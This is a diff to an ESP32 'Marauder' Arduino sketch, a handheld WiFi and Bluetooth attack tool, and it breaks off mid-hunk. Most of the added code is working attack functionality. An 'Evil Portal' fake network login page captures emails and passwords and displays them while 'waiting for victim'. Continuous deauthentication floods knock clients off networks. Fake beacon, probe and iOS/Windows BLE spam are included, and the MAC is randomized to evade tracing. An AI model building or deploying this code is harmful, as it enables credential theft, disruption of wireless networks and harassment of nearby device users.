@@ -1,25 +1,6 @@
 /*
- * ======================================================================================
- * ESP32 MARAUDER - ULTIMATE ALL-IN-ONE
- * ======================================================================================
- * READ THIS CAREFULLY OR THE CODE WILL NOT COMPILE:
- * 
- * 1. PARTITION SCHEME REQUIREMENT:
- *    This sketch contains both full WiFi and Bluetooth support. The default ESP32 
- *    partition scheme (1.3MB APP) is TOO SMALL.
- *    
- *    You MUST go to Tools -> Partition Scheme -> Select "Huge APP (3MB No OTA/1MB SPIFFS)"
- *    
- * 2. LIBRARIES:
- *    Ensure you have "Adafruit SSD1306" and "Adafruit GFX" installed via Library Manager.
- *    
- * 3. CRITICAL ERROR FIX ("Multiple libraries found for BLEDevice.h"):
- *    If you get "redefinition" or "getAdvertising is not a member" errors, it means
- *    you have the "ArduinoBLE" library installed. 
- *    YOU MUST UNINSTALL "ArduinoBLE" or delete it from your libraries folder.
- *    The ESP32 has its own native BLE library that this code requires.
- * 
- * ======================================================================================
+The Ultimate Marauder, TechBot4, but just a test and it works so well. 
+Credit
  */
 
 #include <SPI.h>
@@ -32,6 +13,9 @@
 #include <BLEUtils.h>
 #include <BLEScan.h>
 #include <BLEAdvertisedDevice.h>
+#include <functional>
+#include <DNSServer.h>
+#include <WebServer.h>
 
 // --- CONFIGURATION ---
 #define SCREEN_WIDTH 128
@@ -74,15 +58,18 @@ const char* menu_items[] = {
   "WiFi Deauth BCR",
   "WiFi Deauth Target",
   "Beacon Spam List",
-  "Beacon Spam Rand",
+  "Beacon Spam Real",
   "Rickroll Beacons",
   "Probe Spam",
+  "Evil Portal",
   "BLE Scan",
-  "BT Classic Scan",
-  "BLE Advertising",
+  "BLE Spam Multi",
   "Raw Sniffing",
   "Capture PMKID",
   "Capture EAPOL",
+  "Fox Hunt (Track)",
+  "Defense Ward",
+  "Matrix Graph",
   "Reboot System"
 };
 const int menu_count = sizeof(menu_items) / sizeof(menu_items[0]);
@@ -107,22 +94,190 @@ uint8_t beacon_template[] = {
   0x00, 0x00 
 };
 
+// --- EVIL PORTAL CONTENT ---
+// --- EVIL PORTAL CONTENT ---
+const char index_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head><title>Secure Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; background: #eef2f5; margin: 0; padding: 20px; }
+.card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.08); max-width: 360px; margin: 40px auto; border-top: 4px solid #007bff; }
+.logo { font-size: 48px; color: #007bff; margin-bottom: 20px; }
+h2 { color: #333; margin-top: 0; font-size: 24px; font-weight: 600; margin-bottom: 10px; }
+p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
+input { display: block; width: 100%; padding: 14px; margin: 15px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 15px; outline: none; transition: border 0.2s; }
+input:focus { border-color: #007bff; }
+button { background: #007bff; color: white; border: none; padding: 14px; border-radius: 4px; width: 100%; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; box-shadow: 0 2px 5px rgba(0,123,255,0.2); }
+button:active { background: #0056b3; }
+.footer { margin-top: 30px; font-size: 13px; color: #aaa; }
+</style></head><body>
+<div class="card">
+  <div class="logo">&#128274;</div>
+  <h2>Network Authentication</h2>
+  <p>Standard security check. Please sign in to access the network.</p>
+  <form action="/login" method="POST">
+    <input type="text" name="email" placeholder="Email">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Sign In</button>
+  </form>
+  <div class="footer">Secured by SSL/TLS Encryption</div>
+</div>
+</body></html>
+)rawliteral";
+
+// --- GLOBALS FOR TOOLS ---
+unsigned long last_deauth_time = 0; // For Defense Ward
+volatile int packet_rate = 0;       // For Matrix Graph
+
 // --- FORWARD DECLARATIONS ---
 void wifi_scan_aps();
 void wifi_scan_stations();
 void wifi_deauth_broadcast();
 void wifi_deauth_target(uint8_t* mac);
 void wifi_beacon_spam_list();
-void wifi_beacon_spam_random();
+void wifi_beacon_spam_realistic();
 void wifi_rickroll();
 void wifi_probe_spam();
-void bluetooth_ble_scan();
-void bluetooth_bt_classic_scan();
-void bluetooth_ble_spam();
 void sniffing_start_raw_capture();
 void sniffing_capture_pmkid();
 void sniffing_capture_eapol();
+void evil_portal_run();
+void bluetooth_ble_scan();
+void bluetooth_ble_spam_multi();
+void tool_fox_hunt();
+void tool_defense_ward();
+void tool_matrix_graph();
 void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type);
+
+// --- HELPER FUNCTIONS ---
+void randomize_mac() {
+  uint8_t newMac[6];
+  // Generate random MAC
+  for(int i=0; i<6; i++) newMac[i] = random(0, 256);
+  // Set Locally Administered Bit (0x2) and Unicast (0)
+  newMac[0] = (newMac[0] & 0xFC) | 0x02;
+  
+  esp_wifi_set_mac(WIFI_IF_STA, newMac);
+  esp_wifi_set_mac(WIFI_IF_AP, newMac);
+}
+
+void ui_wait_for_release() {
+  while(digitalRead(JOY_SW) == LOW) { delay(10); } 
+}
+
+bool ui_check_button() {
+  // Check button with simple debounce
+  if (digitalRead(JOY_SW) == LOW) {
+    delay(50); // Debounce
+    if (digitalRead(JOY_SW) == LOW) {
+      while(digitalRead(JOY_SW) == LOW); // Wait for release
+      return true;
+    }
+  }
+  return false;
+}
+
+// Scrollable List Viewer
+// count: Total items
+// getLabel: Function to get string for item i
+void ui_loop_scrollable_list(int count, std::function<String(int)> getLabel) {
+  ui_wait_for_release(); // Prevent immediate exit
+
+  int offset = 0;
+  int selected = 0;
+  bool running = true;
+  unsigned long last_input = 0;
+
+  while (running) {
+    // Input Handling
+    if (ui_check_button()) running = false;
+    
+    int yVal = analogRead(JOY_Y);
+    if (millis() - last_input > 150) {
+      if (yVal < 1000) { // UP
+        selected--;
+        if (selected < 0) {
+          selected = count - 1;
+          offset = max(0, count - 5);
+        } else if (selected < offset) {
+          offset--;
+        }
+        last_input = millis();
+      } else if (yVal > 3000) { // DOWN
+        selected++;
+        if (selected >= count) {
+          selected = 0;
+          offset = 0;
+        } else if (selected >= offset + 5) {
+          offset++;
+        }
+        last_input = millis();
+      }
+    }
+
+    // Render
+    display.clearDisplay();
+    display.setTextSize(1);
+    display.setTextColor(SSD1306_WHITE);
+    
+    // Header
+    display.setCursor(0, 0);
+    display.print(F("Found: "));
+    display.print(count);
+    display.println(F(" (Press Btn)"));
+    display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
+
+    // List
+    for (int i = 0; i < 5; i++) {
+        int idx = offset + i;
+        if (idx >= count) break;
+        
+        display.setCursor(0, 14 + i * 10);
+        if (idx == selected) {
+            display.print(F("> "));
+        } else {
+            display.print(F("  "));
+        }
+        String label = getLabel(idx);
+        if (label.length() > 18) label = label.substring(0, 18);
+        display.println(label);
+    }
+    display.display();
+  }
+}
+
+// Continuous Task Loop
+// title: Screen Title
+// task: Function to call repeatedly
+void ui_loop_continuous_task(String title, std::function<void()> task) {
+    ui_wait_for_release(); // Prevent immediate exit
+
+    bool running = true;
+    
+    display.clearDisplay();
+    display.setTextSize(1);
+    display.setTextColor(SSD1306_WHITE);
+    display.setCursor(0, 0);
+    display.println(title);
+    display.println(F("---------------------"));
+    display.println(F("RUNNING..."));
+    display.println(F("Press Button to STOP"));
+    display.display();
+
+    while(running) {
+        if (ui_check_button()) {
+            running = false;
+            break;
+        }
+        task();
+        yield(); // Let ESP32 handle background tasks
+    }
+
+    display.setCursor(0, 50);
+    display.println(F("STOPPED."));
+    display.display();
+    delay(1000);
+}
 
 // --- WIFI TOOLS ---
 void wifi_send_packet(uint8_t* buf, int len, uint8_t channel) {
@@ -131,112 +286,105 @@ void wifi_send_packet(uint8_t* buf, int len, uint8_t channel) {
 }
 
 void wifi_scan_aps() {
-  Serial.println(F("Starting AP Scan..."));
   display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
+  display.setCursor(0,0);
   display.println(F("Scanning APs..."));
   display.display();
-  
+
   ap_count = WiFi.scanNetworks(false, true, false, 100);
-  for (int i = 0; i < ap_count && i < MAX_APS; i++) {
-    ap_list[i].ssid = WiFi.SSID(i);
-    ap_list[i].rssi = WiFi.RSSI(i);
-    ap_list[i].channel = WiFi.channel(i);
-    memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
+  
+  if (ap_count == 0) {
+      display.println(F("No APs found."));
+      display.display();
+      delay(1000);
+      return;
+  }
+
+  // Populate global list with deduplication
+  std::vector<String> seen_ssids;
+  int unique_count = 0;
+
+  for (int i = 0; i < ap_count && unique_count < MAX_APS; i++) {
+    String s = WiFi.SSID(i);
+    bool duplicate = false;
+    for (String seen : seen_ssids) {
+        if (seen == s) { duplicate = true; break; }
+    }
+    
+    if (!duplicate) {
+        seen_ssids.push_back(s);
+        
+        ap_list[unique_count].ssid = s;
+        ap_list[unique_count].rssi = WiFi.RSSI(i);
+        ap_list[unique_count].channel = WiFi.channel(i);
+        memcpy(ap_list[unique_count].bssid, WiFi.BSSID(i), 6);
+        unique_count++;
+    }
   }
   
-  // Display results
-  display.clearDisplay();
-  display.setCursor(0, 0);
-  display.print(F("Found: "));
-  display.print(ap_count);
-  display.println(F(" APs"));
-  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
-  
-  // Show first few APs
-  for (int i = 0; i < min(4, ap_count); i++) {
-    display.setCursor(0, 14 + i * 12);
-    String ssid = ap_list[i].ssid;
-    if (ssid.length() > 14) ssid = ssid.substring(0, 14);
-    display.print(ssid);
-    display.print(F(" "));
-    display.print(ap_list[i].rssi);
-  }
-  display.display();
-  Serial.print(F("Found "));
-  Serial.print(ap_count);
-  Serial.println(F(" APs"));
+  // Update global count to reflect unique APs
+  ap_count = unique_count;
+
+  // Interactive View
+  ui_loop_scrollable_list(ap_count, [](int i) -> String {
+      return ap_list[i].ssid + " (" + String(ap_list[i].rssi) + ")";
+  });
 }
 
 void wifi_scan_stations() {
-  Serial.println(F("Starting Station Scan..."));
-  Serial.println(F("Enabling promiscuous mode for station detection"));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("STATION SCAN"));
-  display.println(F("Promiscuous mode"));
-  display.println(F("enabled. Check"));
-  display.println(F("Serial for clients"));
-  display.display();
-  esp_wifi_set_promiscuous(true);
-  // Station detection happens in sniffer_callback
+    // Live Station Monitor
+    esp_wifi_set_promiscuous(true);
+    
+    ui_loop_continuous_task("STATION SCAN", []() {
+        // Just keep screen alive, callback prints to Serial
+        // Ideally we would capture stations in a list here, 
+        // but for now we trust the logs as per previous design.
+        // We can add a packet counter visual later.
+    });
+    
+    esp_wifi_set_promiscuous(false);
 }
 
 void wifi_deauth_broadcast() {
-  Serial.println(F("Executing Deauth Broadcast..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("DEAUTH BROADCAST"));
-  display.print(F("Targeting: "));
-  display.print(ap_count);
-  display.println(F(" APs"));
-  display.display();
-  
   if (ap_count == 0) {
-    display.println(F("No APs! Scan first"));
-    display.display();
-    Serial.println(F("No APs scanned. Run WiFi Scan AP first."));
-    return;
+      Serial.println(F("Scan APs first!"));
+      return;
   }
   
-  for (int i = 0; i < ap_count; i++) {
-    memcpy(deauth_template + 10, ap_list[i].bssid, 6);
-    memcpy(deauth_template + 16, ap_list[i].bssid, 6);
-    for (int j = 0; j < 5; j++) {
-      wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[i].channel);
-      delay(1);
-    }
-  }
-  display.println(F("Deauth sent!"));
-  display.display();
+  Serial.println(F("Starting Deauth Broadcast Loop..."));
+  
+  ui_loop_continuous_task("DEAUTH ALL", []() {
+      for (int i = 0; i < ap_count; i++) {
+        memcpy(deauth_template + 10, ap_list[i].bssid, 6);
+        memcpy(deauth_template + 16, ap_list[i].bssid, 6);
+        
+        // Send burst
+        for (int k = 0; k < 64; k++) {
+            wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[i].channel);
+            delay(1);
+        }
+      }
+      delay(10); 
+  });
 }
 
 void wifi_deauth_target(uint8_t* mac) {
-  Serial.println(F("Executing Targeted Deauth..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("TARGETED DEAUTH"));
-  display.display();
+  if (ap_count == 0) return;
+
+  Serial.println(F("Starting Target Deauth Loop..."));
   
-  if (ap_count > 0) {
+  ui_loop_continuous_task("DEAUTH TARGET", [mac]() {
      memcpy(deauth_template + 4, mac, 6);
      memcpy(deauth_template + 10, ap_list[0].bssid, 6);
      memcpy(deauth_template + 16, ap_list[0].bssid, 6);
-     wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[0].channel);
-     display.println(F("Deauth sent to"));
-     String ssid = ap_list[0].ssid;
-     if (ssid.length() > 16) ssid = ssid.substring(0, 16);
-     display.println(ssid);
-     display.display();
-  }
+     
+     // Send burst
+     for (int k = 0; k < 64; k++) {
+         wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[0].channel);
+         delay(1);
+     }
+     delay(10);
+  });
 }
 
 void wifi_beacon_spam_custom(const char* ssid) {
@@ -256,154 +404,285 @@ void wifi_beacon_spam_custom(const char* ssid) {
 }
 
 void wifi_beacon_spam_list() {
-  Serial.println(F("Beacon Spam (List)..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("BEACON SPAM"));
-  display.println(F("Broadcasting:"));
-  display.display();
-  
   const char* ssids[] = {"Free WiFi", "Starbucks", "xfinity", "Marauder_Ghst"};
-  for (int i = 0; i < 4; i++) {
-    display.println(ssids[i]);
-    display.display();
-    wifi_beacon_spam_custom(ssids[i]);
-    delay(10);
-  }
+  ui_loop_continuous_task("BEACON LIST", [ssids]() {
+      for (int i = 0; i < 4; i++) {
+        wifi_beacon_spam_custom(ssids[i]);
+        delay(5);
+      }
+  });
 }
 
-void wifi_beacon_spam_random() {
-  Serial.println(F("Beacon Spam (Random)..."));
-  String rs = "WiFi-" + String(random(1000, 9999));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("RANDOM BEACON"));
-  display.println(F("Broadcasting:"));
-  display.println(rs);
-  display.display();
-  wifi_beacon_spam_custom(rs.c_str());
+void wifi_beacon_spam_realistic() {
+  const char* ssids[] = {
+    "Living Room TV", "HP-Print-55", "iPhone 13", "Uber Connect", 
+    "Starbucks WiFi", "Xfinity Mobile", "Guest WiFi", "Office_Printer", 
+    "Cafe_Free", "NETGEAR-99", "Linksys-2.4", "AndroidAP", 
+    "FBI Surveillance", "Virus_Free", "GetOffMyLawn", "Setup-7728",
+    "DIRECTV_WVB", "Google Home", "Samsung TV", "SkyNet"
+  };
+  
+  ui_loop_continuous_task("REAL BEACONS", [ssids]() {
+      // Broadcast 5 random from list per loop to simulate activity
+      for (int i = 0; i < 5; i++) {
+        const char* name = ssids[random(0, 20)];
+        wifi_beacon_spam_custom(name);
+        delay(10);
+      }
+      
+      // Update stats
+      display.fillRect(0, 30, SCREEN_WIDTH, 10, SSD1306_BLACK);
+      display.setCursor(0, 30);
+      display.print(F("Networks: "));
+      display.print(20);
+      display.display();
+  });
 }
 
 void wifi_rickroll() {
-  Serial.println(F("Rickroll Beacon Spam..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("RICKROLL"));
-  display.println(F("Broadcasting:"));
-  display.display();
   const char* lyrics[] = {"Never Gonna", "Give You Up", "Never Gonna", "Let You Down"};
-  for (int i = 0; i < 4; i++) {
-    wifi_beacon_spam_custom(lyrics[i]);
-    delay(50);
-  }
+  ui_loop_continuous_task("RICKROLL", [lyrics]() {
+      for (int i = 0; i < 4; i++) {
+        wifi_beacon_spam_custom(lyrics[i]);
+        delay(5);
+      }
+  });
 }
 
 void wifi_probe_spam() {
-  Serial.println(F("Probe Spam..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("PROBE SPAM"));
-  display.println(F("Sending probes..."));
-  display.println(F("(placeholder)"));
-  display.display();
-  // TODO: Implement probe request spam
+  // Simple random probe request frame
+  static uint8_t probe_pkt[] = {
+    0x40, 0x00, 0x00, 0x00, 
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest: Broadcast
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src: Random
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID: Broadcast
+    0x00, 0x00, // Seq
+    0x00, 0x00 // Tag length 0 (SSID wildcard)
+  };
+  
+  ui_loop_continuous_task("PROBE SPAM", []() {
+      // Randomize Source
+      for (int i = 10; i < 16; i++) probe_pkt[i] = random(0, 256);
+      wifi_send_packet(probe_pkt, sizeof(probe_pkt), random(1, 14));
+      delay(5);
+  });
 }
 
 // --- BLUETOOTH TOOLS ---
 void bluetooth_ble_scan() {
   Serial.println(F("Starting BLE Scan..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("BLE Scanning..."));
-  display.println(F("(5 seconds)"));
-  display.display();
-  
+    
   if (pBLEScan == nullptr) {
-    display.println(F("BLE not initialized!"));
+    display.clearDisplay();
+    display.setCursor(0,0);
+    display.println(F("BLE Init Failed!"));
     display.display();
-    Serial.println(F("BLE scan failed: pBLEScan is null"));
+    delay(2000);
     return;
   }
   
-  BLEScanResults foundDevices = pBLEScan->start(5, false);
-  int count = foundDevices.getCount();
-  
   display.clearDisplay();
-  display.setCursor(0, 0);
-  display.print(F("Found: "));
-  display.print(count);
-  display.println(F(" devices"));
-  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
-  
-  // Show first few devices
-  for (int i = 0; i < min(4, count); i++) {
-    BLEAdvertisedDevice device = foundDevices.getDevice(i);
-    display.setCursor(0, 14 + i * 12);
-    if (device.haveName()) {
-      String name = device.getName().c_str();
-      if (name.length() > 16) name = name.substring(0, 16);
-      display.print(name);
-    } else {
-      display.print(F("[Unknown]"));
-    }
-  }
+  display.setCursor(0,0);
+  display.println(F("Scanning BLE..."));
   display.display();
-  Serial.print(F("Found "));
-  Serial.print(count);
-  Serial.println(F(" BLE devices"));
-  pBLEScan->clearResults();
+
+  BLEScanResults* foundDevices = pBLEScan->start(5, false);
+  int count = foundDevices->getCount();
+
+  // Interactive View
+  ui_loop_scrollable_list(count, [foundDevices](int i) -> String {
+      BLEAdvertisedDevice d = foundDevices->getDevice(i);
+      if (d.haveName()) return String(d.getName().c_str());
+      return String(d.getAddress().toString().c_str());
+  });
+
+  pBLEScan->clearResults(); 
 }
 
-void bluetooth_bt_classic_scan() {
-  Serial.println(F("BT Classic Scan (Stub)..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("BT CLASSIC SCAN"));
-  display.println(F("Not implemented"));
-  display.println(F("ESP32 BT Classic"));
-  display.println(F("requires extra"));
-  display.println(F("configuration"));
-  display.display();
-}
-
-void bluetooth_ble_spam() {
-  Serial.println(F("Starting BLE Spam..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("BLE ADVERTISING"));
-  display.println(F("Broadcasting:"));
-  display.println(F("Marauder-Spam"));
-  display.display();
-  
+void bluetooth_ble_spam_multi() {
   BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
-  BLEAdvertisementData oAdvertisementData;
-  oAdvertisementData.setFlags(0x06); 
-  oAdvertisementData.setName("Marauder-Spam");
-  pAdvertising->setAdvertisementData(oAdvertisementData);
-  pAdvertising->start();
-  delay(100);
-  pAdvertising->stop();
   
-  display.println(F("Done!"));
-  display.display();
+  // Payloads
+  // iOS (Sour Apple) - 0x004C
+  // Windows (Swift Pair) - 0x0006
+  
+  ui_loop_continuous_task("BLE SPAM (MIX)", [pAdvertising]() {
+      // 1. iOS Spam
+      BLEAdvertisementData iosData;
+      iosData.setFlags(0x06);
+      iosData.setManufacturerData("\x4c\x00\x02\x15\x58\x5c\xde\x93\x1b\x01\x42\xcc\x9a\x13\x25\x00\x9b\xed\xc6\x5e\x00\x00\x00\x00\xc5");
+      pAdvertising->setAdvertisementData(iosData);
+      pAdvertising->start();
+      
+      display.fillRect(0, 30, SCREEN_WIDTH, 20, SSD1306_BLACK);
+      display.setCursor(0, 30);
+      display.print(F("Target: iOS"));
+      display.display();
+      
+      delay(200);
+      pAdvertising->stop();
+      delay(50);
+      
+      // 2. Windows Spam
+      BLEAdvertisementData winData;
+      winData.setFlags(0x06);
+      winData.setManufacturerData("\x06\x00\x03\x00\x80"); 
+      pAdvertising->setAdvertisementData(winData);
+      pAdvertising->start();
+      
+      display.fillRect(0, 30, SCREEN_WIDTH, 20, SSD1306_BLACK);
+      display.setCursor(0, 30);
+      display.print(F("Target: Windows"));
+      display.display();
+      
+      delay(200);
+      pAdvertising->stop();
+      delay(50);
+  });
+}
+
+// --- EVIL PORTAL ---
+// Use a fixed array for simplicity without <vector> overhead if desired, 
+// using std::vector needs #include <vector> which standard in Arduino logic.
+#include <vector> 
+std::vector<String> captured_creds;
+
+void evil_portal_run() {
+  // Randomize MAC for privacy (Must turn off WiFi first)
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+  randomize_mac();
+
+  const byte DNS_PORT = 53;
+  IPAddress apIP(192, 168, 1, 1);
+  DNSServer dnsServer;
+  WebServer server(80);
+  
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP("Free WiFi"); 
+
+  // Redirect all
+  dnsServer.start(DNS_PORT, "*", apIP);
+
+  // Setup Web Server
+  server.on("/", HTTP_GET, [&server]() {
+      server.send_P(200, "text/html", index_html);
+  });
+  
+  server.on("/generate_204", HTTP_GET, [&server]() { 
+      server.send_P(200, "text/html", index_html);
+  });
+
+  server.on("/login", HTTP_POST, [&server]() {
+      String email = server.arg("email");
+      String pass = server.arg("password");
+      Serial.println("CREDENTIALS CAPTURED:");
+      Serial.println(email + ":" + pass);
+      
+      // Store creds
+      String entry = email + ":" + pass;
+      if (captured_creds.size() >= 10) captured_creds.erase(captured_creds.begin()); // Keep last 10
+      captured_creds.push_back(entry);
+      
+      server.send(200, "text/html", "<h1>Verify Success. Connecting...</h1><script>setTimeout(function(){window.location.href='http://google.com';}, 2000);</script>");
+  });
+  
+  server.onNotFound([&server]() {
+      server.send_P(200, "text/html", index_html);
+  });
+  
+  server.begin();
+
+  ui_wait_for_release();
+
+  bool running = true;
+  captured_creds.clear(); 
+  int view_index = 0;
+  unsigned long last_nav = 0;
+
+  while(running) {
+    // 1. Input
+    if (ui_check_button()) running = false;
+    
+    // Joystick Nav
+    int yVal = analogRead(JOY_Y);
+    if (millis() - last_nav > 200 && !captured_creds.empty()) {
+        if (yVal < 1000) { // UP (Previous)
+            if (view_index > 0) view_index--;
+            last_nav = millis();
+        } else if (yVal > 3000) { // DOWN (Next)
+            if (view_index < captured_creds.size() - 1) view_index++;
+            last_nav = millis();
+        }
+    }
+    
+    // Auto-follow newest if we were at the end
+    if (captured_creds.size() > 0 && view_index >= captured_creds.size()) {
+        view_index = captured_creds.size() - 1;
+    }
+
+    dnsServer.processNextRequest();
+    server.handleClient();
+    
+    // 2. UI Render (Detail View)
+    display.clearDisplay();
+    display.setTextSize(1);
+    display.setTextColor(SSD1306_WHITE);
+    
+    if (captured_creds.empty()) {
+        display.setCursor(0, 20);
+        display.println(F("Status: LISTENING"));
+        display.println(F("----------------"));
+        display.println(F("Connect to:"));
+        display.println(F("Free WiFi"));
+        display.setCursor(0, 55);
+        display.println(F("Waiting for victim.."));
+    } else {
+        // Parse current item
+        String s = captured_creds[view_index];
+        int sep = s.indexOf(':');
+        String e = (sep != -1) ? s.substring(0, sep) : s;
+        String p = (sep != -1) ? s.substring(sep+1) : "";
+
+        // Header
+        display.setCursor(0, 0);
+        display.print(F("Log "));     
+        display.print(view_index + 1);
+        display.print(F("/"));
+        display.print(captured_creds.size());
+        display.print(F(" (Use Joy)"));
+        display.drawLine(0, 9, SCREEN_WIDTH, 9, SSD1306_WHITE);
+        
+        // Body (Wrapped)
+        display.setCursor(0, 12);
+        display.println(F("Email:"));
+        display.println(e); // println wraps automatically
+        
+        // Dynamic spacing based on email length approx
+        int passY = display.getCursorY() + 2; 
+        display.setCursor(0, passY);
+        display.println(F("Pass:"));
+        display.println(p);
+    }
+    
+    display.display();
+    delay(50); 
+  }
+  
+  dnsServer.stop();
+  server.stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_STA);
 }
 
 // --- SNIFFER ---
+static int pkts_captured = 0; // For visual feedback
+
 void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  pkts_captured++;
+  packet_rate++;
+  
   wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
   uint8_t* payload = pkt->payload;
   int len = pkt->rx_ctrl.sig_len;
@@ -412,67 +691,86 @@ void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (len > 34 && payload[32] == 0x88 && payload[33] == 0x8e) {
     Serial.print(F("EAPOL detected!"));
   }
+  
+  // Deauth Detection (for Defense Ward)
+  if (type == WIFI_PKT_MGMT) {
+    uint8_t fc0 = payload[0];
+    if ((fc0 & 0xFC) == 0xC0 || (fc0 & 0xFC) == 0xA0) {
+        last_deauth_time = millis();
+    }
+  }
 }
 
 void sniffing_start_raw_capture() {
-  Serial.println(F("Raw Capture Started..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("RAW SNIFFING"));
-  display.println(F("Active..."));
-  display.println(F("Check Serial for"));
-  display.println(F("captured packets"));
-  display.display();
+  pkts_captured = 0;
   esp_wifi_set_promiscuous(true);
+  
+  ui_loop_continuous_task("RAW SNIFFING", []() {
+      // Update stats on specific interval or just rely on global var?
+      // Since ui_loop clears screen once, we need to manually update it or custom loop.
+      // reusing ui_loop_continuous_task is hard for dynamic text updates without param.
+      // Let's just overload the behavior by hacking the "task" to draw too? 
+      // No, ui_loop_continuous does not clear screen inside loop.
+      // So we can draw here.
+      
+      display.fillRect(0, 30, SCREEN_WIDTH, 10, SSD1306_BLACK);
+      display.setCursor(0, 30);
+      display.print(F("Pkts: "));
+      display.println(pkts_captured);
+      display.display();
+      delay(100);
+  });
+  
+  esp_wifi_set_promiscuous(false);
 }
 
 void sniffing_capture_pmkid() {
-  Serial.println(F("PMKID Capture..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("PMKID CAPTURE"));
-  display.println(F("Listening..."));
-  display.println(F("Check Serial for"));
-  display.println(F("PMKID hashes"));
-  display.display();
+  pkts_captured = 0;
   esp_wifi_set_promiscuous(true);
+  ui_loop_continuous_task("PMKID SNIFF", []() {
+      display.fillRect(0, 30, SCREEN_WIDTH, 10, SSD1306_BLACK);
+      display.setCursor(0, 30);
+      display.print(F("Pkts: "));
+      display.println(pkts_captured);
+      display.display();
+      delay(100);
+  });
+  esp_wifi_set_promiscuous(false);
 }
 
 void sniffing_capture_eapol() {
-  Serial.println(F("EAPOL Capture..."));
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(0, 0);
-  display.println(F("EAPOL CAPTURE"));
-  display.println(F("Listening..."));
-  display.println(F("Check Serial for"));
-  display.println(F("handshakes"));
-  display.display();
+  pkts_captured = 0;
   esp_wifi_set_promiscuous(true);
+  ui_loop_continuous_task("EAPOL SNIFF", []() {
+      display.fillRect(0, 30, SCREEN_WIDTH, 10, SSD1306_BLACK);
+      display.setCursor(0, 30);
+      display.print(F("Pkts: "));
+      display.println(pkts_captured);
+      display.display();
+      delay(100);
+  });
+  esp_wifi_set_promiscuous(false);
 }
 
 // --- UI FUNCTIONS ---
+// Note: Yellow/Blue OLED has Y=0-15 YELLOW, Y=16-63 BLUE
 void ui_draw_menu() {
   display.clearDisplay();
   display.setTextSize(1);
   display.setTextColor(SSD1306_WHITE);
   
-  // Header
-  display.setCursor(10, 0);
+  // Header in Yellow Zone (Y 0-15, centered at Y=4)
+  display.setCursor(10, 4);
   display.println(F("MARAUDER MENU"));
-  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
+  display.drawLine(0, 15, SCREEN_WIDTH, 15, SSD1306_WHITE);
   
-  // Menu items
+  // Menu items in Blue Zone (starting Y=17)
   for (int i = 0; i < 5; i++) {
     int idx = (current_menu_index + i) % menu_count;
-    display.setCursor(0, 14 + i * 10);
+    int y = 17 + i * 9;
+    display.setCursor(0, y);
     if (i == 0) {
-      display.fillRect(0, 13, SCREEN_WIDTH, 10, SSD1306_WHITE);
+      display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
       display.setTextColor(SSD1306_BLACK);
     } else {
       display.setTextColor(SSD1306_WHITE);
@@ -508,20 +806,188 @@ void ui_select_item() {
         else Serial.println(F("No APs to target"));
         break;
